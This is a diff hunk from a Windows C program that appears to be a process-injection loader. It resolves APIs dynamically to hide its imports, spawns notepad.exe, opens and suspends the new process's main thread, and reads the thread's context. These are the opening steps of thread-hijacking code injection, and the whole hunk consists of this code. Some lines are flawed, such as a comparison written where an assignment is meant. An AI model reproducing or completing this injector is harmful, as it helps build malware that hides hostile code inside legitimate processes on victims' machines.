@@ -180,27 +180,31 @@ int main(int argc, char** argv, char* envp) {
 	dw.dwSize = sizeof(dw);
 
 
-	BOOL proc = ((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)(L"C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
-	HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
+	BOOL proc =((BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))ptr_CreateProcessA)(L"C:\\Windows\\System32\\notepad.exe",NULL, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi );
+	if (proc == FALSE){
+		e(" create process failed");
 
-	if(((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32First)(snap, &dw)==TRUE){
-		while  (((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32Next)(snap, &dw) == TRUE){
-
-		if (stricmp(dw.szExeFile, "notepad.exe")== 0){
-			pid == dw.th32ProcessID;
-		}
 	}
-	}
+	//HANDLE snap = ((HANDLE(WINAPI*)(DWORD, DWORD))ptr_CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
 
-	((BOOL(WINAPI*)(HANDLE))ptr_CloseHandle)(snap);
+	//if(((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32First)(snap, &dw)==TRUE){
+	//	while  (((BOOL(WINAPI*)(HANDLE, LPROCESSENTRY32))ptr_Process32Next)(snap, &dw) == TRUE){
 
+	//	if (stricmp(dw.szExeFile, "notepad.exe")== 0){
+	//		pid == dw.th32ProcessID;
+	//	}
+	//}
+	//}
+
+	//((BOOL(WINAPI*)(HANDLE))ptr_CloseHandle)(snap);
+
+	hProc = pi.hProcess;
+	hThread = pi.hThread;
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, ULONG))ptr_NtOpenThread)(hThread, THREAD_ALL_ACCESS, &oa ,0);
-
 	statchecker(status);
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PULONG))ptr_NtSuspendThread)(hThread, &n);
-
 
 	status = ((NTSTATUS(NTAPI*)(HANDLE, PCONTEXT))ptr_NtGetContextThread)(hThread, CTX);
 
